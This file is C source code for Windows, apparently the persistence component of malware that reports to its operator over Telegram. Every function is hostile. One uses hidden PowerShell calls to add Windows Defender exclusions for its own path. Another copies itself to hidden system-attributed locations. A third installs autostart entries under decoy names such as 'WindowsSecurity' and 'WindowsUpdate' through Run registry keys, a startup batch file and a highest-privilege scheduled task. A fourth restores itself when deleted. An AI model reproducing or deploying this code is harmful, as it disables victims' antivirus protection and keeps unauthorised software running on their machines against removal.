#include "../include/persistence.h"
#include "../include/telegram.h"

void AddDefenderExclusion() {
    char dir[MAX_PATH];
    strcpy_s(dir, sizeof(dir), g_exePath);
    char* lastSlash = strrchr(dir, '\\');
    if (lastSlash) *lastSlash = 0;

    char cmd[2048];
    sprintf_s(cmd, sizeof(cmd), "powershell -Command \"Add-MpPreference -ExclusionPath '%s'\"", dir);
    WinExec(cmd, SW_HIDE);
    sprintf_s(cmd, sizeof(cmd), "powershell -Command \"Add-MpPreference -ExclusionProcess '%s'\"", g_exePath);
    WinExec(cmd, SW_HIDE);

    for (int i = 0; i < REPLICATION_COUNT; i++) {
        char pathDir[MAX_PATH];
        strcpy_s(pathDir, sizeof(pathDir), replicationPaths[i]);
        char* lastSlashPath = strrchr(pathDir, '\\');
        if (lastSlashPath) {
            *lastSlashPath = 0;
            sprintf_s(cmd, sizeof(cmd), "powershell -Command \"Add-MpPreference -ExclusionPath '%s'\"", pathDir);
            WinExec(cmd, SW_HIDE);
        }
    }
}

void ReplicateToDisk() {
    for (int i = 0; i < REPLICATION_COUNT; i++) {
        char dir[MAX_PATH];
        strcpy_s(dir, sizeof(dir), replicationPaths[i]);
        char* lastSlash = strrchr(dir, '\\');
        if (lastSlash) { *lastSlash = 0; CreateDirectoryA(dir, NULL); }

        if (GetFileAttributesA(replicationPaths[i]) == INVALID_FILE_ATTRIBUTES) {
            if (CopyFileA(g_exePath, replicationPaths[i], FALSE)) {
                SetFileAttributesA(replicationPaths[i], FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

                char alertMsg[512];
                sprintf_s(alertMsg, sizeof(alertMsg), "📦 Backup created at %s", replicationPaths[i]);
                SendTextToTelegram(alertMsg);
            }
        }
    }
}

void InstallPersistence() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsSecurity", 0, REG_SZ, (const BYTE*)g_exePath, (DWORD)strlen(g_exePath) + 1);
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemUpdater", 0, REG_SZ, (const BYTE*)g_exePath, (DWORD)strlen(g_exePath) + 1);
        RegCloseKey(hKey);
    }
    char startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        char batPath[MAX_PATH];
        sprintf_s(batPath, sizeof(batPath), "%s\\SecurityHelper.bat", startupPath);
        FILE* f = fopen(batPath, "w");
        if (f) { fprintf(f, "@echo off\nstart \"\" \"%s\"\n", g_exePath); fclose(f); SetFileAttributesA(batPath, FILE_ATTRIBUTE_HIDDEN); }
    }
    char cmd[1024];
    sprintf_s(cmd, sizeof(cmd), "schtasks /create /tn \"WindowsUpdate\" /tr \"%s\" /sc ONLOGON /f /rl HIGHEST", g_exePath);
    WinExec(cmd, SW_HIDE);
}

void CheckAndHealAll() {
    if (GetFileAttributesA(g_exePath) == INVALID_FILE_ATTRIBUTES) {
        const char* backupSource = replicationPaths[0];
        if (GetFileAttributesA(backupSource) != INVALID_FILE_ATTRIBUTES) {
            if (CopyFileA(backupSource, g_exePath, FALSE)) {
                SetFileAttributesA(g_exePath, FILE_ATTRIBUTE_NORMAL);
                SendTextToTelegram("🔄 Restored main EXE from backup!");
            }
        } else {
            SendTextToTelegram("⚠️ Main EXE deleted AND backup missing! Need manual reinstall.");
        }
    }

    InstallPersistence();
    AddDefenderExclusion();
    ReplicateToDisk();
}
